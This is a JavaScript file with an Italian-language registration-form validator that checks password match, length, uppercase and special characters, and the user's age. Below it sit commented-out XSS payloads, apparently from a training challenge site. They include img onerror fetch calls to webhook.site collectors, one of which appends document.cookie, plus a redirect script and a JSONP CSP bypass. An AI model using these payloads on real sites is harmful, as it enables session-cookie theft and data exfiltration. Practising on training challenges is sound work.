function validateForm() {
    const password1 = document.forms["registrationForm"]["password1"].value;
    const password2 = document.forms["registrationForm"]["password2"].value;

    // // print password1
    // console.log(password1);

    if (password2 !== password1) {
        alert("Le due password non coincidono");
        return false;
    }
    const uppercase = /[A-Z]/;
    const specialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/;

    if (password1.length < 8) {
        alert("La password deve essere lunga almeno 8 caratteri")
        return false;
    }

    if (!uppercase.test(password1)) {
        alert("La password deve contenere almeno un carattere maiuscolo")
        return false;
    }

    if (!specialChar.test(password1)) {
        alert("La password deve contenere almeno un carattere speciale")
        return false;
    }

    const bday = document.forms["registrationForm"]["bday"].value;
    const today = new Date();
    const birthDate = new Date(bday);
    let age = today.getFullYear() - birthDate.getFullYear();
    const monthDiff = today.getMonth() - birthDate.getMonth();
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate()) || age < 16) {
        alert("ciao");
        return false;
    }

    return true;
}



// <h1> <script> window.location.href="https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f"; </script> </h1>


// <h1> <script> 
//   https://xss.challenge.training.hacq.me/challenges/baby01.php
//  </script> </h1>


// <img src='#' onerror=fetch("https://webhook.site/29601392-3225-44b7-963f-911784ca5c5a")>


// <h1> <img src= https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f ></img></h1>


// </h1> <script> 
//   fetch("https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=alert(1);");
//  </script> 
//  <h1>

// <img src="" onerror="fetch('https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f/SONOIO' + document.cookie);">




// </h1 <script>

// </h1>
// <script src="csp01-jsonp.php?callback=alert(1);callback">
// </script>  
// <h1>
  



// https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=callback